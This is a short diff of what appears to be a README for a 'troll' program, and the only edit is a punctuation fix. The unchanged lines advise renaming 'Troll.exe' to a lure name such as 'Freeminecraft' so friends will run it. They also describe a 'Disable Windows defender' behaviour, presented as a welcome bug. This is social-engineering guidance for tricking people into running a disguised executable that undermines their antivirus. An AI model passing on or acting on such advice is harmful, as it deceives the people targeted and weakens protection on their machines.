@@ -9,5 +9,5 @@ If you want to add something from yourself, you can, because I will provide all 
 # FOR BETTER TROLL
 reneame file "Troll.exe" e.g "Freeminecraft"
 # Disable Windows defender
-It's a bug but's this bug make this better (:
+It's a bug but, this bug make this better (:
 # GOOD LUCK TROLLING YOUR FRIENDS!
